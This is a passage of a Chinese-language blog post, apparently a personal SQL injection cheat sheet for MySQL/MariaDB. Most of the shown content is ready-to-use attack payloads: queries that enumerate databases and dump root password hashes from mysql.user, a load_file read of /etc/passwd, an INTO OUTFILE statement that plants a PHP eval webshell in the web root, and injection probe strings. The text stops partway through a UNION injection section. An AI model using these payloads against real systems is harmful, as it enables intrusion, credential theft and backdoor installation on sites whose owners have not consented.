<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="自用 Sqli 备忘录，随时更新\n"><title>Sql注入备忘录</title>
<link rel=canonical href=https://zeddyu.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/><link rel=stylesheet href=https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///scss/style.min.10c221bc47e4e94f27ea1e7ab28b3ebe2133ce2020a73c833b3276d59450e687.css integrity="sha256-EMIhvEfk6U8n6h56sos+viEzziAgpzyDOzJ21ZRQ5oc=" crossorigin=anonymous><meta property='og:title' content="Sql注入备忘录"><meta property='og:description' content="自用 Sqli 备忘录，随时更新\n"><meta property='og:url' content='https://zeddyu.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/'><meta property='og:site_name' content="Zeddy's Blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Sec'><meta property='article:tag' content='sql注入'><meta property='article:published_time' content='2019-03-06T15:33:04+00:00'><meta property='article:modified_time' content='2019-03-06T15:33:04+00:00'><meta name=twitter:title content="Sql注入备忘录"><meta name=twitter:description content="自用 Sqli 备忘录，随时更新\n"><link rel="shortcut icon" href=/favicon.ico><style>body:has(.article-content){.article-readmore { display: none; }}</style><script>enScroll=!1,enFdl=!1,extCurrent=void 0,filename=void 0,targetText=void 0,splitOrigin=void 0;const lStor=localStorage,sStor=sessionStorage,doc=document,docEl=document.documentElement,docBody=document.body,docLoc=document.location,w=window,s=screen,nav=navigator||{},extensions=["pdf","xls","xlsx","doc","docx","txt","rtf","csv","exe","key","pps","ppt","pptx","7z","pkg","rar","gz","zip","avi","mov","mp4","mpe","mpeg","wmv","mid","midi","mp3","wav","wma"];function a(e,t,n,o){const j="G-PDESKL57LT",r=()=>Math.floor(Math.random()*1e9)+1,c=()=>Math.floor(Date.now()/1e3),F=()=>(sStor._p||(sStor._p=r()),sStor._p),E=()=>r()+"."+c(),_=()=>(lStor.cid_v4||(lStor.cid_v4=E()),lStor.cid_v4),m=lStor.getItem("cid_v4"),v=()=>m?void 0:enScroll==!0?void 0:"1",p=()=>(sStor.sid||(sStor.sid=c()),sStor.sid),O=()=>{if(!sStor._ss)return sStor._ss="1",sStor._ss;if(sStor.getItem("_ss")=="1")return void 0},a="1",g=()=>{if(sStor.sct)if(enScroll==!0)return sStor.sct;else x=+sStor.getItem("sct")+ +a,sStor.sct=x;else sStor.sct=a;return sStor.sct},i=docLoc.search,b=new URLSearchParams(i),h=["q","s","search","query","keyword"],y=h.some(e=>i.includes("&"+e+"=")||i.includes("?"+e+"=")),u=()=>y==!0?"view_search_results":enScroll==!0?"scroll":enFdl==!0?"file_download":"page_view",f=()=>enScroll==!0?"90":void 0,C=()=>{if(u()=="view_search_results"){for(let e of b)if(h.includes(e[0]))return e[1]}else return void 0},d=encodeURIComponent,k=e=>{let t=[];for(let n in e)e.hasOwnProperty(n)&&e[n]!==void 0&&t.push(d(n)+"="+d(e[n]));return t.join("&")},A=!1,S="https://ga.zeddyu-lu.workers.dev/collect_path",M=k({v:"2",tid:j,_p:F(),sr:(s.width*w.devicePixelRatio+"x"+s.height*w.devicePixelRatio).toString(),ul:(nav.language||void 0).toLowerCase(),cid:_(),_fv:v(),_s:"1",dl:docLoc.origin+docLoc.pathname+i,dt:doc.title||void 0,dr:doc.referrer||void 0,sid:p(),sct:g(),seg:"1",en:u(),"epn.percent_scrolled":f(),"ep.search_term":C(),"ep.file_extension":e||void 0,"ep.file_name":t||void 0,"ep.link_text":n||void 0,"ep.link_url":o||void 0,_ss:O(),_dbg:A?1:void 0}),l=S+"?"+M;if(nav.sendBeacon)nav.sendBeacon(l);else{let e=new XMLHttpRequest;e.open("POST",l,!0)}}a();function sPr(){return(docEl.scrollTop||docBody.scrollTop)/((docEl.scrollHeight||docBody.scrollHeight)-docEl.clientHeight)*100}doc.addEventListener("scroll",sEv,{passive:!0});function sEv(){const e=sPr();if(e<90)return;enScroll=!0,a(),doc.removeEventListener("scroll",sEv,{passive:!0}),enScroll=!1}document.addEventListener("DOMContentLoaded",function(){let e=document.getElementsByTagName("a");for(let t=0;t<e.length;t++)if(e[t].getAttribute("href")!=null){const n=e[t].getAttribute("href"),s=n.substring(n.lastIndexOf("/")+1),o=s.split(".").pop();(e[t].hasAttribute("download")||extensions.includes(o))&&e[t].addEventListener("click",fDl,{passive:!0})}});function fDl(e){enFdl=!0;const t=e.currentTarget.getAttribute("href"),n=t.substring(t.lastIndexOf("/")+1),s=n.split(".").pop(),o=n.replace("."+s,""),i=e.currentTarget.text,r=t.replace(docLoc.origin,"");a(s,o,i,r),enFdl=!1}</script></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky compact"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io//img/avatar_hu6396534569623136415.webp width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>Zeddy's Blog</a></h1><h2 class=site-description></h2></div></header><ol class=menu-social><li><a href=https://github.com/ZeddYu target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://zeddyu.github.io/atom.xml target=_blank title=Rss rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://x.com/ZeddYu_Lu target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/ads/><svg class="icon icon-tabler icon-tabler-ad" width="44" height="44" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M7 15v-4a2 2 0 014 0v4"/><line x1="7" y1="13" x2="11" y2="13"/><path d="M17 9v6h-1.5a1.5 1.5.0 111.5-1.5"/></svg>
<span>Advertisement</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#basic>Basic</a><ol><li><a href=#查看当前数据库版本>查看当前数据库版本</a></li><li><a href=#当前登录用户>当前登录用户</a></li><li><a href=#当前使用的数据库>当前使用的数据库</a></li><li><a href=#当前的操作系统>当前的操作系统</a></li><li><a href=#路径相关>路径相关</a></li><li><a href=#字母数字相关>字母/数字相关</a></li><li><a href=#字符串截取>字符串截取</a></li><li><a href=#注释>&lsquo;注释&rsquo;</a></li><li><a href=#常用语句>常用语句</a></li></ol></li><li><a href=#注入技术>注入技术</a><ol><li><a href=#union-注入>Union 注入</a><ol><li><a href=#判断是否可以注入>判断是否可以注入</a></li><li><a href=#数值型注入>数值型注入</a></li><li><a href=#字符型注入>字符型注入</a></li><li><a href=#查询列数>查询列数</a></li><li><a href=#基本用法>基本用法</a></li><li><a href=#过滤了逗号的-union-注入>过滤了逗号的 union 注入</a></li></ol></li><li><a href=#报错注入>报错注入</a><ol><li><a href=#分类>分类</a></li><li><a href=#floor>floor</a></li><li><a href=#updatexml有长度限制最长32位>UpdateXml(有长度限制,最长32位)</a></li><li><a href=#extractvalue有长度限制最长32位>ExtractValue(有长度限制,最长32位)</a></li><li><a href=#name_const适用于低版本不太好用>NAME_CONST(适用于低版本，不太好用)</a></li><li><a href=#error-based-double-query-injection>Error based Double Query Injection</a></li><li><a href=#exp555以上>exp(5.5.5以上)</a></li><li><a href=#测试未通过存在可用性的>测试未通过，存在可用性的</a></li></ol></li><li><a href=#bool-盲注>Bool 盲注</a><ol><li><a href=#构造-bool-条件>构造 bool 条件</a></li><li><a href=#构造逻辑判断>构造逻辑判断</a></li><li><a href=#利用-order-by-盲注>利用 order by 盲注</a></li></ol></li><li><a href=#延时注入>延时注入</a><ol><li><a href=#检测方法>检测方法</a></li><li><a href=#payload>payload</a></li></ol></li><li><a href=#insertupdatedelete-注入>insert/update/delete 注入</a><ol><li><a href=#insert>insert</a></li><li><a href=#update>update</a></li><li><a href=#delete>delete</a></li></ol></li><li><a href=#order-by-后注入>Order by 后注入</a><ol><li><a href=#报错注入-1>报错注入</a></li><li><a href=#bool盲注-利用-rand>bool盲注 利用 rand()</a></li><li><a href=#延时注入-order-by-if>延时注入 order by if()</a></li></ol></li><li><a href=#limit-注入>Limit 注入</a><ol><li><a href=#报错注入-2>报错注入</a></li></ol></li><li><a href=#group-by-注入>Group By 注入</a><ol><li><a href=#报错注入-3>报错注入</a></li><li><a href=#延时注入-1>延时注入</a></li><li><a href=#union-注入-1>Union 注入</a></li></ol></li><li><a href=#读写文件>读写文件</a><ol><li><a href=#load_file读取>load_file()读取</a></li><li><a href=#select-导出>SELECT 导出</a></li><li><a href=#写入-webshell>写入 WebShell</a></li></ol></li><li><a href=#宽字节注入>宽字节注入</a><ol><li><a href=#原理>原理</a></li><li><a href=#利用>利用</a></li></ol></li><li><a href=#表名可控注入>表名可控注入</a><ol><li><a href=#表名不完全可控且desc的表名含有反引号select的表名不含反引号>表名不完全可控且DESC的表名含有反引号,SELECT的表名不含反引号</a></li><li><a href=#表名不完全可控且desc的表名不含反引号select的表名含有反引号>表名不完全可控且DESC的表名不含反引号,SELECT的表名含有反引号</a></li></ol></li><li><a href=#无列名注入>无列名注入</a><ol><li><a href=#别名>别名</a></li><li><a href=#变量>变量</a></li></ol></li><li><a href=#可报错时爆表名字段名库名>可报错时爆表名、字段名、库名</a><ol><li><a href=#字段名>字段名</a></li><li><a href=#表名>表名</a></li><li><a href=#库名>库名</a></li></ol></li><li><a href=#约束攻击>约束攻击</a></li><li><a href=#一次性注入出全部结构>一次性注入出全部结构</a></li></ol></li><li><a href=#绕过技巧>绕过技巧</a><ol><li><a href=#空格替代>空格替代</a></li><li><a href=#绕过关键字>绕过关键字</a><ol><li><a href=#双写关键字>双写关键字</a></li><li><a href=#十六进制>十六进制</a></li><li><a href=#ascii>ASCII</a></li><li><a href=#逗号绕过>逗号绕过</a></li><li><a href=#比较符号绕过>比较符号绕过</a></li><li><a href=#字符串比较函数>字符串比较函数</a></li><li><a href=#字符串连接函数>字符串连接函数</a></li></ol></li><li><a href=#运算符>运算符</a><ol><li><a href=#算术运算符>算术运算符</a></li><li><a href=#比较运算符>比较运算符</a></li><li><a href=#逻辑运算符>逻辑运算符</a></li><li><a href=#位运算符>位运算符</a></li></ol></li></ol></li><li><a href=#reference>Reference</a></li></ol><ol><li><a href=#basic-1>Basic</a><ol><li><a href=#系统库>系统库</a></li><li><a href=#注释-1>注释</a></li><li><a href=#查询语句>查询语句</a><ol><li><a href=#主机名>主机名</a></li><li><a href=#数据库版本>数据库版本</a></li><li><a href=#数据库名>数据库名</a></li><li><a href=#数据库ip地址>数据库ip地址</a></li><li><a href=#暴当前表中的列>暴当前表中的列</a></li><li><a href=#暴任意表和列>暴任意表和列</a></li><li><a href=#暴数据库数据>暴数据库数据</a></li><li><a href=#exmaples>Exmaples</a></li></ol></li></ol></li><li><a href=#reference-1>Reference</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/sec/ style=background-color:#0b0;color:#fff>Sec</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/sql%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/>Sql注入备忘录</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Mar 06, 2019</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>19 minute read</time></div><div class=article-readmore><a href=/p/sql%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/>Read More…</a></div></footer></div></header><section class=article-content><p>自用 Sqli 备忘录，随时更新</p><p>[TOC]</p><h1 id=mysql基于-10311-mariadb>Mysql(基于 10.3.11-MariaDB)</h1><h2 id=basic>Basic</h2><h3 id=查看当前数据库版本>查看当前数据库版本</h3><ul><li><p>VERSION()</p></li><li><p>@@VERSION</p></li><li><p>@@GLOBAL.VERSION</p></li></ul><h3 id=当前登录用户>当前登录用户</h3><ul><li><p>USER()</p></li><li><p>CURRENT_USER()</p></li><li><p>SYSTEM_USER()</p></li><li><p>SESSION_USER()</p></li></ul><h3 id=当前使用的数据库>当前使用的数据库</h3><ul><li><p>DATABASE()</p></li><li><p>SCHEMA()</p></li></ul><h3 id=当前的操作系统>当前的操作系统</h3><ul><li>@@version_compile_os</li></ul><h3 id=路径相关>路径相关</h3><ul><li>@@BASEDIR : mysql安装路径：</li><li>@@SLAVE_LOAD_TMPDIR : 临时文件夹路径：</li><li>@@DATADIR : 数据存储路径：</li><li>@@CHARACTER_SETS_DIR : 字符集设置文件路径</li><li>@@LOG_ERROR : 错误日志文件路径：</li><li>@@PID_FILE : pid-file文件路径</li><li>@@BASEDIR : mysql安装路径：</li><li>@@SLAVE_LOAD_TMPDIR : 临时文件夹路径</li></ul><h3 id=字母数字相关>字母/数字相关</h3><ul><li>ASCII(): 获取字母的ascii码值</li><li>BIN(): 返回值的二进制串表示</li><li>CONV(): 进制转换</li><li>FLOOR(): 函数只返回整数部分，小数部分舍弃。</li><li>ROUND(): 函数四舍五入，大于0.5的部分进位，不到则舍弃。</li><li>LOWER()：转成小写字母</li><li>UPPER(): 转成大写字母</li><li>HEX():十六进制编码</li><li>UNHEX()：十六进制解码</li></ul><h3 id=字符串截取>字符串截取</h3><ul><li>MID(column_name,start[,length]) start起始为1</li><li>LEFT(str,length) length为从左边开始要返回的字符数</li><li>RIGHT(str,length). length为从右边开始要返回的字符数</li><li>SUBSTR(str,pos,len) 从pos开始截取len个,pos起始为1,pos 可以是负值</li><li>SUBSTRING(str,pos,len). 与subsets()相同</li></ul><h3 id=注释>&lsquo;注释&rsquo;</h3><ul><li><code>— -</code>(&ndash;后面有个空格)<ul><li><code>select * from message ;-- -where id =1;</code></li></ul></li></ul><hr><ul><li><code>select * from message ;--where id =1;</code></li><li>—+<ul><li><code>select * from message ;—+where id =1;</code></li></ul></li><li>#<ul><li><code>select * from message ;#where id =1;</code></li></ul></li><li>%00<ul><li><code>select * from message ;%00where id =1;</code></li></ul></li><li>/**/<ul><li><code>select * from message ;/*where id =1;*/</code></li></ul></li></ul><h3 id=常用语句>常用语句</h3><p>查找所有用户</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=n>group_concat</span><span class=p>(</span><span class=k>user</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>mysql</span><span class=p>.</span><span class=k>user</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>用户hash：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=n>group_concat</span><span class=p>(</span><span class=n>password</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>mysql</span><span class=p>.</span><span class=k>user</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=k>user</span><span class=o>=</span><span class=s1>&#39;root&#39;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>数据库</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=n>group_concat</span><span class=p>(</span><span class=k>schema_name</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>schemata</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>select</span><span class=w> </span><span class=k>distinct</span><span class=p>(</span><span class=n>database_name</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>mysql</span><span class=p>.</span><span class=n>innodb_table_stats</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>select</span><span class=w> </span><span class=k>distinct</span><span class=p>(</span><span class=n>Db</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>mysql</span><span class=p>.</span><span class=n>db</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>表名：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=n>group_concat</span><span class=p>(</span><span class=k>table_name</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>table_schema</span><span class=o>=</span><span class=s1>&#39;table_name&#39;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>//</span><span class=err>表中有主码约束，非空约束等完整性约束条件的才能用这个语句查询出来</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>SELECT</span><span class=w> </span><span class=n>group_concat</span><span class=p>(</span><span class=k>table_name</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>table_constraints</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>table_schema</span><span class=o>=</span><span class=s1>&#39;table_name_xxx&#39;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>//</span><span class=n>mysql</span><span class=o>&gt;</span><span class=mi>5</span><span class=p>.</span><span class=mi>6</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>select</span><span class=w> </span><span class=k>distinct</span><span class=p>(</span><span class=k>table_name</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>mysql</span><span class=p>.</span><span class=n>innodb_index_stats</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>列名:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=n>group_concat</span><span class=p>(</span><span class=k>column_name</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>columns</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=k>table_name</span><span class=o>=</span><span class=s1>&#39;column_name_xxx&#39;</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>读文件：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=n>load_file</span><span class=p>(</span><span class=s1>&#39;/etc/passwd&#39;</span><span class=p>);</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>写文件：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-mysql data-lang=mysql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=s1>&#39;&lt;?php @eval($_POST[1]);?&gt;&#39;</span><span class=w> </span><span class=k>into</span><span class=w> </span><span class=k>outfile</span><span class=w> </span><span class=s1>&#39;/var/www/html/shell.php&#39;</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h2 id=注入技术>注入技术</h2><h3 id=union-注入>Union 注入</h3><h4 id=判断是否可以注入>判断是否可以注入</h4><p>假设有: <code>www.test.com/?id=1</code></p><h4 id=数值型注入>数值型注入</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?id=1+1
</span></span><span class=line><span class=cl>?id=-1 or 1=1
</span></span><span class=line><span class=cl>?id=-1 or 10-2=8
</span></span><span class=line><span class=cl>?id=1 and 1=2
</span></span><span class=line><span class=cl>?id=1 and 1=1
</span></span></code></pre></td></tr></table></div></div><h4 id=字符型注入>字符型注入</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?id=1&#39;
</span></span><span class=line><span class=cl>?id=1&#34;
</span></span><span class=line><span class=cl>?id=1&#39; and &#39;1&#39;=&#39;1
</span></span><span class=line><span class=cl>?id=1&#34; and &#34;1&#34;=&#34;1
</span></span><span class=line><span class=cl>?id=1&#39;)
</span></span><span class=line><span class=cl>?id=1&#34;)
</span></span><span class=line><span class=cl>?id=1&#39;) and &#39;1&#39;=&#39;1
</span></span><span class=line><span class=cl>?id=1&#34;) and &#34;1&#34;=&#34;1
</span></span></code></pre></td></tr></table></div></div><h4 id=查询列数>查询列数</h4><p>用<code>UNION SELECT</code>注入时，若后面要注出的数据的列与原数据列数不同，则会失败。所以需要先猜解列数。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>UNION</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>3</span><span class=w> </span><span class=o>#</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>UNION</span><span class=w> </span><span class=k>ALL</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>3</span><span class=w> </span><span class=o>#</span><span class=w>
